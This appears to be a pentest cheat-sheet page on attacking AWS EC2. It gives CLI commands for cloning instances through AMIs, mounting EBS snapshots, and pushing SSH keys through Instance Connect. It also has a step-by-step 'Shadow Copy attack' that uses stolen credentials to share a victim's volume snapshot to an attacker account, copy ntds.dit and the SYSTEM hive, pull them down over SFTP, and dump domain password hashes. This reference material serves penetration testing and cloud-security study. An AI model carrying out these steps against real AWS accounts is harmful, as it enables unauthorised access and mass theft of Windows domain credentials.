# AWS - Service - EC2

* [dufflebag](https://labs.bishopfox.com/dufflebag) - Find secrets that are accidentally exposed via Amazon EBS's "public" mode


## Copy EC2 using AMI Image

First you need to extract data about the current instances and their AMI/security groups/subnet : `aws ec2 describe-images --region eu-west-1`

```powershell
# create a new image for the instance-id
$ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1  

# add key to AWS
$ aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1  

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
$ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance 
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1 
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```


## Mount EBS volume to EC2 Linux

:warning: EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken.

1. Head over to EC2 –> Volumes and create a new volume of your preferred size and type.
2. Select the created volume, right click and select the "attach volume" option.
3. Select the instance from the instance text box as shown below : `attach ebs volume`
    ```powershell
    aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone
    aws ec2 attach-volume –-volume-id volume_id –-instance-id instance_id --device device
    ```
4. Now, login to your ec2 instance and list the available disks using the following command : `lsblk`
5. Check if the volume has any data using the following command : `sudo file -s /dev/xvdf`
6. Format the volume to ext4 filesystem  using the following command : `sudo mkfs -t ext4 /dev/xvdf`
7. Create a directory of your choice to mount our new ext4 volume. I am using the name “newvolume” : `sudo mkdir /newvolume`
8. Mount the volume to "newvolume" directory using the following command : `sudo mount /dev/xvdf /newvolume/`
9. cd into newvolume directory and check the disk space for confirming the volume mount : `cd /newvolume; df -h .`


## Shadow Copy attack

**Requirements**:

* EC2:CreateSnapshot
* [Static-Flow/CloudCopy](https://github.com/Static-Flow/CloudCopy)

**Exploit**:

1. Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions
2. Run `"Describe-Instances"` and show in list for attacker to select
3. Run `"Create-Snapshot"` on volume of selected instance
4. Run `"modify-snapshot-attribute"` on new snapshot to set `"createVolumePermission"` to attacker AWS Account
5. Load AWS CLI with Attacker Credentials
6. Run `"run-instance"` command to create new linux ec2 with our stolen snapshot
7. Ssh run `"sudo mkdir /windows"`
8. Ssh run `"sudo mount /dev/xvdf1 /windows/"`
9. Ssh run `"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"`
10. Ssh run `"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"`
11. Ssh run `"sudo chown ec2-user:ec2-user /home/ec2-user/*"`
12. SFTP get `"/home/ec2-user/SYSTEM ./SYSTEM"`
13. SFTP get `"/home/ec2-user/ntds.dit ./ntds.dit"`
14. locally run `"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'`, expects secretsdump to be on path


## Access Snapshots 

1. Get the `owner-id`
    ```powershell
    $ aws --profile flaws sts get-caller-identity
    "Account": "XXXX26262029",
    ```
2. List snapshots
    ```powershell
    $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
    "SnapshotId": "snap-XXXX342abd1bdcb89",
    ```
3. Create a volume using the previously obtained `snapshotId`
    ```powershell
    $ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
    ```
4. In AWS console, deploy a new EC2 Ubuntu based, attach the volume and then mount it on the machine.
    ```ps1
    $ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
    $ lsblk
    $ sudo file -s /dev/xvda1
    $ sudo mount /dev/xvda1 /mnt
    ```


## Instance Connect

Push an SSH key to EC2 instance

```powershell
# https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/
$ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq ".[][].Instances | .[] | {InstanceId, KeyName, State}"
$ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds
```


## References

* [How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016](https://devopscube.com/mount-ebs-volume-ec2-instance/)